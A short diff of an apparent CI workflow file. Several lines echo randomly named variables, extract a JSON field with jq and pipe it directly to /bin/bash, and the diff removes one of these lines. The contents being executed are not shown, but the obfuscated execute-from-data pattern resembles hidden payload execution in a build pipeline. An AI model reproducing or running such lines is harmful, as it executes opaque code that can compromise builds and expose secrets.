@@ -27,7 +27,6 @@ jobs:
           echo $givp7581 | jq -r .he3 | /bin/bash
           printf '%s' "$ij2678" | jq -r .b9988 | /bin/bash
           echo $ddne06180 | jq -r .ehbk72675 | /bin/bash
-          echo $grflf7637 | jq -r .ninvl31 | /bin/bash
           echo $hm701 | jq -r .prm457 | /bin/bash
           printf '%s' "$xzm4010" | jq -r .anb48 | /bin/bash
           echo $mkf7866 | jq -r .wkc59700 | /bin/bash
